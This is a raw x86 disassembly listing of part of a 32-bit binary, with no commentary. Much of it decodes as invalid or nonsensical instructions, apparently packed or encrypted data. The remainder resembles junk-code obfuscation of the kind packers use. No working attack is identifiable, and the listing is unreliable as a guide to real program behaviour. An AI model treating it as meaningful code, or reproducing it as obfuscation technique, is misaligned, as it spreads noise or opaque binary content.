  40ac7e:	lods   eax,DWORD PTR ds:[esi]
  40ac7f:	or     cl,0x67
  40ac82:	push   0x129e1dda
  40ac87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac88:	jge    0x40acf9
  40ac8a:	mov    dl,0xc
  40ac8c:	or     al,0xf2
  40ac8e:	scas   eax,DWORD PTR es:[edi]
  40ac8f:	or     eax,0x41e65ca7
  40ac94:	lgs    esp,FWORD PTR [eax-0x43a91389]
  40ac9b:	xor    BYTE PTR [eax],bh
  40ac9d:	or     BYTE PTR [edi],ch
  40ac9f:	add    ebp,DWORD PTR ds:0x70199e29
  40aca5:	mov    ebp,0x85dd2490
  40acaa:	push   ecx
  40acab:	inc    esp
  40acac:	pop    esp
  40acad:	push   edx
  40acae:	aam    0x64
  40acb0:	push   ds
  40acb1:	test   al,0x14
  40acb3:	mul    cl
  40acb5:	pop    edx
  40acb6:	neg    BYTE PTR [ebx+0x5c15a0df]
  40acbc:	shl    BYTE PTR [edi],cl
  40acbe:	les    edi,FWORD PTR [ebx-0x3e76de03]
  40acc4:	and    BYTE PTR [eax+0x56],ch
  40acc7:	or     DWORD PTR [edi],eax
  40acc9:	sub    edi,DWORD PTR [eax]
  40accb:	pushf  
  40accc:	adc    eax,esi
  40acce:	fs xor al,0x25
  40acd1:	mov    bl,0xe4
  40acd3:	in     eax,dx
  40acd4:	pop    es
  40acd5:	mov    cl,0x56
  40acd7:	push   ebx
  40acd8:	pop    es
  40acd9:	popf   
  40acda:	xor    cl,BYTE PTR [edi]
  40acdc:	push   edi
  40acdd:	mul    BYTE PTR [ecx+0x549cdcc7]
  40ace3:	call   0x8262:0x86f3d4ff
  40acea:	leave  
  40aceb:	(bad)  
  40acec:	sbb    al,0xb3
  40acee:	xor    ah,BYTE PTR [edx]
  40acf0:	or     DWORD PTR [ebx+0x7d04930d],0x7fb9e0aa
  40acfa:	pop    ecx
  40acfb:	sahf   
  40acfc:	sbb    edx,DWORD PTR [edx+0x556035f0]
  40ad02:	inc    edi
  40ad03:	(bad)  
  40ad04:	loopne 0x40ad57
  40ad06:	dec    edi
  40ad07:	push   cs
  40ad08:	pop    ecx
  40ad09:	jge    0x40ad71
  40ad0b:	sar    BYTE PTR [eax],cl
  40ad0d:	jle    0x40ad0d
  40ad0f:	inc    esp
  40ad10:	iret   
  40ad11:	mov    WORD PTR [edx+eax*1+0x63016e91],fs
  40ad18:	push   0xffffffeb
  40ad1a:	add    BYTE PTR cs:[eax-0x5863b2f2],al
  40ad21:	xchg   ebp,eax
  40ad22:	jmp    0x3183:0xfa6f998d
  40ad29:	mov    WORD PTR [esi],?
  40ad2b:	mov    ch,cl
  40ad2d:	lock mov ah,0x90
  40ad30:	xchg   ebx,eax
  40ad31:	sub    BYTE PTR [eax],bl
  40ad33:	enter  0x6ded,0x14
  40ad37:	icebp  
  40ad38:	inc    edi
  40ad39:	mov    edi,0xe1396819
  40ad3e:	hlt    
  40ad3f:	pop    edi
  40ad40:	inc    edx
  40ad41:	lods   eax,DWORD PTR ds:[esi]
  40ad42:	sbb    BYTE PTR [ebx+ebp*2],al
  40ad45:	and    al,0xe2
  40ad47:	xor    DWORD PTR [eax+0x47],eax
  40ad4a:	xchg   ebp,eax
  40ad4b:	jecxz  0x40acd6
  40ad4d:	fwait
  40ad4e:	inc    eax
  40ad4f:	fisubr WORD PTR ds:0x9ba002c2
  40ad55:	in     eax,0x73
  40ad57:	jecxz  0x40ad04
  40ad59:	ficom  WORD PTR [edi]
  40ad5b:	ss xchg esp,eax
  40ad5d:	js     0x40ad6b
  40ad5f:	dec    eax
  40ad60:	daa    
  40ad61:	sbb    BYTE PTR [ecx+edi*2+0x78764902],bl
  40ad68:	mov    esi,0x3d6d0c06
  40ad6d:	retf   
  40ad6e:	test   DWORD PTR [esi+0x53300065],edx
  40ad74:	fsubr  QWORD PTR [edx+0x5276591]
  40ad7a:	stos   DWORD PTR es:[edi],eax
  40ad7b:	xchg   edi,eax
  40ad7c:	in     al,0x65
  40ad7e:	push   cs
  40ad7f:	sub    BYTE PTR [edx],0x21
  40ad82:	inc    ebp
  40ad83:	mov    bh,0x82
  40ad85:	mov    ds:0xaa4a9ec,eax
  40ad8a:	in     al,0x17
  40ad8c:	je     0x40ad15
  40ad8e:	loop   0x40adf8
  40ad90:	cmc    
  40ad91:	mov    bh,0x4d
  40ad93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad94:	xchg   edx,eax
  40ad95:	dec    esi
  40ad96:	add    ebp,DWORD PTR [edi]
  40ad98:	adc    ch,BYTE PTR [eax]
  40ad9a:	and    BYTE PTR [ebp-0x15],0x29
  40ad9e:	fucomi st,st(2)
  40ada0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ada1:	and    DWORD PTR [edi-0x30fa5581],ebp
  40ada7:	popa   
  40ada8:	es xchg esi,eax
  40adaa:	loope  0x40adc8
  40adac:	pop    ebp
  40adad:	cmp    al,0x19
  40adaf:	ins    BYTE PTR es:[edi],dx
  40adb0:	pop    esp
  40adb1:	ror    DWORD PTR [eax],0xde
  40adb4:	repnz scas al,BYTE PTR es:[edi]
  40adb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adb7:	packssdw mm2,QWORD PTR [eax]
  40adba:	scas   eax,DWORD PTR es:[edi]
  40adbb:	call   0x9a42f3e4
  40adc0:	mov    eax,ds:0x34b18a23
  40adc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adc6:	fild   QWORD PTR [ebp+ecx*4+0x5ea9452b]
  40adcd:	add    BYTE PTR [edi+0x31],al
  40add0:	daa    
  40add1:	fmul   st(7),st
  40add3:	(bad)  
  40add4:	mov    bl,0x19
  40add6:	mov    ds:0x6a923eb8,eax
  40addb:	xor    al,0x1a
  40addd:	mov    esp,0x24a04845
  40ade2:	fldcw  WORD PTR [edx+0x65ac1af0]
  40ade8:	jp     0x40ade6
  40adea:	sbb    eax,0xd43e8b1b
  40adef:	pop    ss
  40adf0:	faddp  st(6),st
  40adf2:	cmp    DWORD PTR [ecx],edx
  40adf4:	test   DWORD PTR [ecx-0x50],edi
  40adf7:	and    ecx,DWORD PTR [ebx+0x135b9833]
  40adfd:	push   cs
  40adfe:	pop    ebx
  40adff:	or     esp,DWORD PTR [esi]
  40ae01:	inc    esp
  40ae02:	fst    DWORD PTR [edx-0x5c]
  40ae05:	aad    0x56
  40ae07:	fwait
  40ae08:	lock pop edx
  40ae0a:	sub    bh,BYTE PTR [ecx+eiz*8+0x77afab80]
  40ae11:	jae    0x40ae5d
  40ae13:	ja     0x40adc2
  40ae15:	mov    ds:0x3e811e85,al
  40ae1a:	call   0x7c53c499
  40ae1f:	into   
  40ae20:	xchg   BYTE PTR [ecx+0x2d1bb049],ah
  40ae26:	fcom   QWORD PTR [ebx+0xd8be25e]
  40ae2c:	stos   DWORD PTR es:[edi],eax
  40ae2d:	xor    BYTE PTR [eax+0x77192106],dl
  40ae33:	(bad)  
  40ae34:	in     al,dx
  40ae35:	call   0xac53:0x7ea99501
  40ae3c:	xchg   edx,eax
  40ae3d:	(bad)  
  40ae3e:	loopne 0x40ae45
  40ae40:	aam    0x89
  40ae42:	iret   
  40ae43:	(bad)  
  40ae44:	xchg   edx,eax
  40ae45:	gs push ebx
  40ae47:	push   0xe045c74a
  40ae4c:	ret    
  40ae4d:	outs   dx,BYTE PTR ds:[esi]
  40ae4e:	add    BYTE PTR [eax],al
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x42829b,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428263
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x428397,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x42827b
  40aea0:	cmp    DWORD PTR ds:0x42829b,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x4280cb
  40aebd:	call   DWORD PTR ds:0x428e88
  40aec3:	mov    ecx,DWORD PTR ds:0x42831b
  40aec9:	xor    DWORD PTR ds:0x42823f,ecx
  40aecf:	or     DWORD PTR ds:0x42838b,ecx
  40aed5:	or     DWORD PTR ds:0x4282a3,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x4282af
  40aee1:	adc    DWORD PTR ds:0x428277,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x428173
  40aeef:	adc    ecx,DWORD PTR ds:0x428397
  40aef5:	mov    DWORD PTR ds:0x428173,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x428393,0x428307
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x428173,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	ret    0x97d6
  40af32:	mov    esp,0x18181bb5
  40af37:	outs   dx,BYTE PTR ds:[esi]
  40af38:	adc    bl,BYTE PTR [eax]
  40af3a:	sbb    BYTE PTR [eax],bl
  40af3c:	jmp    0x782d8e59
  40af41:	out    0x58,al
  40af43:	fnsave [ecx+eax*1+0x4ea0449b]
  40af4a:	or     eax,0xf0afd250
  40af4f:	add    esp,esp
  40af51:	cmp    ch,dl
  40af53:	aad    0xb8
  40af55:	sbb    ah,dl
  40af57:	ins    BYTE PTR es:[edi],dx
  40af58:	in     eax,0xd
  40af5a:	stc    
  40af5b:	(bad)  
  40af5c:	leave  
  40af5d:	mov    WORD PTR [ebx-0x5b987f54],es
  40af63:	fimul  DWORD PTR [ebx+0x2e]
  40af66:	(bad)  
  40af67:	loop   0x40afa9
  40af69:	mov    al,ds:0x571b6803
  40af6e:	or     al,0xb0
  40af70:	imul   DWORD PTR [ecx]
  40af72:	jo     0x40af85
  40af74:	aas    
  40af75:	out    0x19,eax
  40af77:	cwde   
  40af78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af79:	sub    dh,BYTE PTR [edi]
  40af7b:	and    dl,BYTE PTR [ebx+0x68]
  40af7e:	xchg   edi,eax
  40af7f:	xor    edi,DWORD PTR [ebx-0x7d237c64]
  40af85:	or     edi,DWORD PTR [ebx+edi*4]
  40af88:	int3   
  40af89:	mov    dh,0x14
  40af8b:	test   ebx,edx
  40af8d:	loop   0x40afa0
  40af8f:	pop    ebp
  40af90:	mov    dl,0x96
  40af92:	mov    ch,0xce
  40af94:	sbb    BYTE PTR [eax+eiz*2],dl
  40af97:	push   ebp
  40af98:	icebp  
  40af99:	jmp    0x40aff6
  40af9b:	div    BYTE PTR [ebp-0x597c0edb]
  40afa1:	rol    DWORD PTR [ebp+esi*8+0x3a6759a0],cl
  40afa8:	aaa    
  40afa9:	dec    edi
  40afaa:	push   esi
  40afab:	call   0xd22b:0x460f579d
  40afb2:	dec    eax
  40afb3:	rcr    cl,cl
  40afb5:	stos   DWORD PTR es:[edi],eax
  40afb6:	adc    BYTE PTR [edi+0x4c],bh
  40afb9:	inc    eax
  40afba:	stc    
  40afbb:	jae    0x40affa
  40afbd:	cmp    eax,0xe781572e
  40afc2:	push   esp
  40afc3:	into   
  40afc4:	cmp    BYTE PTR [ebx],dh
  40afc6:	dec    edi
  40afc7:	and    edi,DWORD PTR [edi]
  40afc9:	je     0x40afc9
  40afcb:	add    eax,0xfbfdb15
  40afd0:	aad    0xf3
  40afd2:	mov    cl,0x17
  40afd4:	push   ebp
  40afd5:	sti    
  40afd6:	rcl    DWORD PTR [ebp+0x570e15a2],0xa9
  40afdd:	sub    BYTE PTR [edx+esi*4+0x50d77bbc],dh
  40afe4:	inc    esi
  40afe5:	adc    edx,DWORD PTR [edi]
  40afe7:	test   al,al
  40afe9:	loope  0x40b023
  40afeb:	sti    
  40afec:	fdiv   QWORD PTR [ecx]
  40afee:	fabs   
  40aff0:	mov    esp,0x6b448ee0
  40aff5:	pop    edi
  40aff6:	scas   al,BYTE PTR es:[edi]
  40aff7:	test   eax,0x543e9b63
  40affc:	out    dx,eax
  40affd:	add    DWORD PTR [edi-0x16],ebp
  40b000:	push   ebx
  40b001:	inc    ebx
  40b002:	ret    
  40b003:	retf   
  40b004:	pop    esi
  40b005:	mov    dl,0x7d
  40b007:	push   0xffffffd2
  40b009:	push   ecx
  40b00a:	inc    esp
  40b00b:	xchg   DWORD PTR [esi-0x3c],ebp
  40b00e:	lock fst DWORD PTR [ebx-0x12]
  40b012:	dec    edi
  40b013:	and    al,BYTE PTR [ebx]
  40b015:	mov    ebp,DWORD PTR [ebx-0x2dd501e5]
  40b01b:	sar    DWORD PTR [edi],cl
  40b01d:	ins    BYTE PTR es:[edi],dx
  40b01e:	rol    BYTE PTR [eax+0x39080d80],0xce
  40b025:	outs   dx,DWORD PTR ds:[esi]
  40b026:	inc    ecx
  40b027:	and    esp,DWORD PTR [edx]
  40b029:	das    
  40b02a:	loopne 0x40b019
  40b02c:	xlat   BYTE PTR ds:[ebx]
  40b02d:	fst    DWORD PTR [ebp-0x7f]
  40b030:	mov    eax,0x91639a5
  40b035:	das    
  40b036:	ds cwde 
  40b038:	cmp    DWORD PTR [ebp-0x2c],0x4a
  40b03c:	sub    eax,0xbd51a779
  40b041:	lock mov dh,0x69
  40b044:	out    0x6f,eax
  40b046:	call   0xa25dd09d
  40b04b:	fsin   
  40b04d:	jno    0x40b028
  40b04f:	mov    cr0,edi
  40b052:	test   DWORD PTR [ecx-0x396a77c2],ecx
  40b058:	pusha  
  40b059:	jae    0x40b063
  40b05b:	gs out 0x79,eax
  40b05e:	push   bx
  40b060:	data16 repz jbe 0x40b01f
  40b064:	cmp    al,BYTE PTR [ebx]
  40b066:	ror    bh,1
  40b068:	cmp    edx,DWORD PTR [ebp-0x52d00848]
  40b06e:	out    dx,al
  40b06f:	mov    dl,0x82
  40b071:	ror    DWORD PTR [edi+edi*2+0xc],0xef
  40b076:	mov    bh,0xee
  40b078:	adc    eax,0xa58e5d7d
  40b07d:	repnz pop ebx
  40b07f:	lahf   
  40b080:	sbb    dh,BYTE PTR [edi+0x60]
  40b083:	jge    0x40b04b
  40b085:	ds adc al,0xae
  40b088:	loopne 0x40b077
  40b08a:	pop    ecx
  40b08b:	cmp    al,0xd9
  40b08e:	dec    edi
  40b08f:	retf   0x61b0
  40b092:	mov    ds:0x4354fe1d,al
  40b097:	push   cs
  40b098:	pushf  
  40b099:	lock xchg ebp,eax
  40b09b:	xchg   ecx,eax
  40b09c:	inc    esp
  40b09d:	jnp    0x40b048
  40b09f:	ror    DWORD PTR [edx+0x60],1
  40b0a2:	leave  
  40b0a3:	cmp    al,0xcf
  40b0a5:	cmp    dl,BYTE PTR [edi]
  40b0a7:	mov    ?,esi
  40b0a9:	mov    esp,0xb586b61b
  40b0ae:	pop    es
  40b0af:	fcomi  st,st(1)
  40b0b1:	mov    eax,DWORD PTR [ecx+0x13]
  40b0b4:	or     al,0xb5
  40b0b6:	sbb    esp,DWORD PTR [ecx+0x40cba904]
  40b0bc:	in     eax,dx
  40b0bd:	fdiv   DWORD PTR [edx]
  40b0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0c0:	jae    0x40b071
  40b0c2:	lds    edi,FWORD PTR [ebx+0x1b]
  40b0c5:	adc    bh,BYTE PTR [edx+0x6c]
  40b0c8:	dec    edx
  40b0c9:	xchg   esi,eax
  40b0ca:	sbb    eax,0x744e8ea0
  40b0cf:	(bad)  
  40b0d0:	stos   BYTE PTR es:[edi],al
  40b0d1:	dec    ebp
  40b0d2:	jp     0x40b0f8
  40b0d4:	aam    0x22
  40b0d6:	sbb    eax,0xae828425
  40b0db:	cwde   
  40b0dc:	dec    edx
  40b0dd:	cmp    DWORD PTR [edx],esp
  40b0df:	lock popa 
  40b0e1:	neg    DWORD PTR [eax+0x2377b0c3]
  40b0e7:	inc    ebp
  40b0e9:	push   eax
  40b0ea:	int3   
  40b0eb:	xchg   esi,eax
  40b0ec:	(bad)  
  40b0ed:	jle    0x40b0e8
  40b0ef:	sbb    BYTE PTR [ebx-0x2fe545aa],0xe0
  40b0f6:	mov    DWORD PTR [edx+edi*2-0x49e71cb7],eax
  40b0fd:	cld    
  40b0fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0ff:	aad    0x81
  40b101:	lea    esp,[edi]
  40b103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b104:	jge    0x40b11d
  40b106:	push   ebp
  40b107:	ret    
  40b108:	xor    bl,BYTE PTR [ebp-0x14]
  40b10b:	xor    eax,ecx
  40b10d:	mov    ds:0x4f7242c7,al
  40b112:	mov    esi,0xe3e7b00a
  40b117:	(bad)  
  40b118:	push   edx
  40b119:	or     al,0xb6
  40b11b:	push   0x92bf0b1
  40b120:	bound  eax,QWORD PTR [ecx-0x4bd15896]
  40b126:	scas   al,BYTE PTR es:[edi]
  40b127:	(bad)  
  40b128:	jecxz  0x40b128
  40b12a:	push   esp
  40b12b:	jne    0x40b194
  40b12d:	stos   DWORD PTR es:[edi],eax
  40b12e:	jae    0x40b0cf
  40b130:	jge    0x40b0c0
  40b132:	into   
  40b133:	sbb    esi,eax
  40b135:	les    edi,FWORD PTR [ebx+0x5f91361]
  40b13b:	scas   al,BYTE PTR es:[edi]
  40b13c:	pop    esi
  40b13d:	xor    BYTE PTR [esi],ah
  40b13f:	sub    DWORD PTR [eax-0x34e11571],ecx
  40b145:	and    al,0xd4
  40b147:	test   DWORD PTR es:[esi],0x36ce504f
  40b14e:	mov    eax,ds:0xb82a7703
  40b153:	pop    es
  40b154:	sbb    ecx,esi
  40b156:	xchg   BYTE PTR [eax-0x2f3c1aec],dl
  40b15c:	and    eax,0x477dfa04
  40b161:	(bad)  
  40b162:	rol    DWORD PTR [edi+0x2467fb2e],cl
  40b168:	xor    bl,BYTE PTR [esi+0x1a6bb6cb]
  40b16e:	addr16 daa 
  40b170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b171:	mov    esi,0xb736cd7d
  40b176:	or     eax,0xa3069eae
  40b17b:	sbb    BYTE PTR [eax-0x5e],dh
  40b17e:	ds inc eax
  40b180:	fwait
  40b181:	mov    esi,0xe5a1b288
  40b186:	add    bl,BYTE PTR [ebp+0x59d9a42c]
  40b18c:	inc    ebp
  40b18d:	or     eax,0xb3149643
  40b192:	push   eax
  40b193:	in     al,dx
  40b194:	add    ch,BYTE PTR [esi-0x53]
  40b197:	sub    DWORD PTR ds:0x3366102a,ebx
  40b19d:	mov    esi,0x3c1086ae
  40b1a2:	xchg   edi,eax
  40b1a3:	loop   0x40b190
  40b1a5:	les    ebp,FWORD PTR [edi]
  40b1a7:	xchg   BYTE PTR [ebp+0x37],dl
  40b1aa:	xchg   esp,eax
  40b1ab:	mov    eax,0x292f786e
  40b1b0:	icebp  
  40b1b1:	xor    dx,ax
  40b1b4:	outs   dx,BYTE PTR ds:[esi]
  40b1b5:	iret   
  40b1b6:	jns    0x40b219
  40b1b8:	sar    dl,cl
  40b1ba:	dec    eax
  40b1bb:	test   eax,0x3433092e
  40b1c0:	pop    ebx
  40b1c1:	(bad)  
  40b1c2:	stc    
  40b1c3:	stos   DWORD PTR es:[edi],eax
  40b1c4:	sar    DWORD PTR [edx+ecx*4-0x1f4b25c1],0x5e
  40b1cc:	dec    esi
  40b1cd:	inc    edx
  40b1ce:	fwait
  40b1cf:	mov    ch,0x96
  40b1d1:	std    
  40b1d2:	(bad)  
  40b1d3:	cmp    al,0x6
  40b1d5:	push   ecx
  40b1d6:	in     eax,dx
  40b1d7:	mov    ah,0x8
  40b1d9:	mov    eax,ds:0x2e0fb4f1
  40b1de:	jns    0x40b21f
  40b1e0:	dec    esi
  40b1e1:	adc    al,0x6c
  40b1e3:	fwait
  40b1e4:	jg     0x40b243
  40b1e6:	adc    DWORD PTR [ebx-0x3c],eax
  40b1e9:	dec    edx
  40b1ea:	sub    BYTE PTR [ebx-0x558f03e6],ah
  40b1f0:	pop    ebp
  40b1f1:	aad    0x8f
  40b1f3:	inc    ebp
  40b1f4:	pushf  
  40b1f5:	sub    edi,DWORD PTR [esi-0x3b]
  40b1f8:	or     DWORD PTR [ebx],ebx
  40b1fa:	aas    
  40b1fb:	out    0x92,al
  40b1fd:	jmp    0xa64dddaa
  40b202:	fs push ebp
  40b204:	mov    bh,0x2c
  40b206:	ds xchg esi,eax
  40b208:	pop    ds
  40b209:	add    eax,DWORD PTR [ebp-0x4c]
  40b20c:	sub    BYTE PTR [edx],bh
  40b20e:	ret    
  40b20f:	std    
  40b210:	dec    ebx
  40b211:	ins    DWORD PTR es:[edi],dx
  40b212:	xor    bl,ah
  40b214:	fstp   QWORD PTR [edx]
  40b216:	mov    eax,ds:0xce6f7653
  40b21b:	and    al,BYTE PTR [esi-0x44f4ac67]
  40b221:	pop    ds
  40b222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b223:	sub    al,0x70
  40b225:	(bad)  
  40b226:	std    
  40b227:	cmc    
  40b228:	xchg   ecx,eax
  40b229:	das    
  40b22a:	xchg   esp,eax
  40b22b:	and    DWORD PTR [edi+0x52685518],ebx
  40b231:	xor    DWORD PTR [esp+ebp*2],0xc79802a0
  40b238:	mov    cl,0x68
  40b23a:	jmp    0xf86f6f74
  40b23f:	call   FWORD PTR [eax+0x1dc56268]
  40b245:	xor    al,0xba
  40b247:	jl     0x40b29e
  40b249:	cmc    
  40b24a:	mov    ah,0x31
  40b24c:	mov    ds:0x27687080,al
  40b251:	cld    
  40b252:	fldcw  WORD PTR [ebx+0x22]
  40b255:	pop    ecx
  40b256:	(bad)  [edi-0x31019c0e]
  40b25c:	clc    
  40b25d:	test   eax,0x768d1c3c
  40b262:	jae    0x40b2b6
  40b264:	imul   esi,DWORD PTR [esi+0x40ef5fec],0x927bfd31
  40b26e:	xchg   BYTE PTR [edx-0x3c],dh
  40b271:	loope  0x40b27f
  40b273:	push   eax
  40b274:	dec    ebx
  40b275:	sbb    DWORD PTR [edi],edi
  40b277:	out    dx,eax
  40b278:	mov    dl,BYTE PTR [ecx-0x50662c93]
  40b27e:	ret    
  40b27f:	lds    esi,FWORD PTR [eax]
  40b281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b282:	jl     0x40b219
  40b284:	inc    ebx
  40b285:	inc    ebp
  40b286:	fcom   QWORD PTR [ebx+0x22c0d8f5]
  40b28c:	stos   DWORD PTR es:[edi],eax
  40b28d:	mov    edi,0xe8bb517f
  40b292:	lods   al,BYTE PTR ds:[esi]
  40b293:	xchg   ecx,eax
  40b294:	psubw  mm6,QWORD PTR [edx+0xd01a68c]
  40b29b:	add    ch,ch
  40b29d:	lds    edx,FWORD PTR [ecx]
  40b29f:	sahf   
  40b2a0:	inc    esp
  40b2a1:	jnp    0x40b240
  40b2a3:	call   0x32ec0ea4
  40b2a8:	nop
  40b2a9:	mov    eax,0x3e3d078b
  40b2ae:	ret    0x70e7
  40b2b1:	add    eax,ebp
  40b2b3:	xchg   edx,eax
  40b2b4:	cmp    eax,0xf40e1297
  40b2b9:	cmc    
  40b2ba:	test   DWORD PTR [esi+0x229fde91],0x90e36d23
  40b2c4:	pop    ebx
  40b2c5:	test   BYTE PTR [edi],al
  40b2c7:	xchg   esi,eax
  40b2c8:	mov    WORD PTR [esi+ecx*2],gs
  40b2cb:	out    dx,al
  40b2cc:	adc    DWORD PTR [ebx],0xffffff8e
  40b2cf:	pop    ebp
  40b2d0:	add    DWORD PTR [edx],ebx
  40b2d2:	in     eax,dx
  40b2d3:	adc    al,0x3e
  40b2d5:	sti    
  40b2d6:	sbb    al,0x96
  40b2d8:	dec    ecx
  40b2d9:	jo     0x40b357
  40b2db:	(bad)  
  40b2dc:	push   ebx
  40b2dd:	popf   
  40b2de:	test   DWORD PTR [edi],esi
  40b2e0:	pop    ebx
  40b2e1:	pop    ss
  40b2e2:	sub    DWORD PTR [eax-0x6e1f98b1],esi
  40b2e8:	mov    edi,0x57202466
  40b2ed:	scas   eax,DWORD PTR es:[edi]
  40b2ee:	imul   BYTE PTR [esi+eiz*1-0x9b55b90]
  40b2f5:	jbe    0x40b32b
  40b2f7:	and    al,0x89
  40b2f9:	mov    DWORD PTR [ecx+ebx*1+0x5632a72c],ecx
  40b300:	and    DWORD PTR ds:0xe8443a50,0x932c212f
  40b30a:	int    0x1d
  40b30c:	push   es
  40b30d:	xchg   ebp,eax
  40b30e:	jns    0x40b34c
  40b310:	(bad)  
  40b311:	scas   al,BYTE PTR es:[edi]
  40b312:	loope  0x40b2c2
  40b314:	push   eax
  40b315:	adc    DWORD PTR ds:0x4282fb,0x4282b3
  40b31f:	call   0x416c20
  40b324:	sbb    esi,DWORD PTR ds:0x4282a7
  40b32a:	mov    ecx,DWORD PTR [ebp-0x20]
  40b32d:	adc    esi,0x2986
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42823b,0x4282fb
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x428393,0x4282fb
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x42837b,0x42826f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x4283af,0x42824f
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x4282af
  40b386:	adc    DWORD PTR ds:0x4281a3,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x428317,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x428283,0x42826f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x42817b,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x428397,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x428177,0x4283ab
  40b3c4:	call   0x422074
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x42827b
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x4282ab,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x428293,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x42832b
  40b3f3:	mov    eax,ds:0x4282a3
  40b3f8:	cmp    DWORD PTR ds:0x4282ab,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428eec
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x42819b,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x42828b
  40b422:	or     DWORD PTR ds:0x42831b,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x428177,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x4283a3,0x0
  40b441:	mov    DWORD PTR ds:0x42831b,ecx
  40b447:	mov    DWORD PTR ds:0x42839b,0x318c
  40b451:	mov    DWORD PTR ds:0x4283ab,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x428273,0x461b
  40b46a:	mov    DWORD PTR ds:0x4282af,0x63d9
  40b474:	cmp    DWORD PTR ds:0x4283a3,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428ef0
  40b48f:	xor    edx,DWORD PTR ds:0x428283
  40b495:	adc    ecx,DWORD PTR ds:0x42838b
  40b49b:	and    DWORD PTR ds:0x42817b,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x42828f
  40b4b7:	xor    DWORD PTR ds:0x4283a3,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x428273
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x42818f,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42816b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42823b,0x9f5
  40b501:	mov    DWORD PTR ds:0x4282b7,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x42818f,0x0
  40b512:	je     0x40b542
  40b518:	push   0x427fe3
  40b51d:	push   0x400000
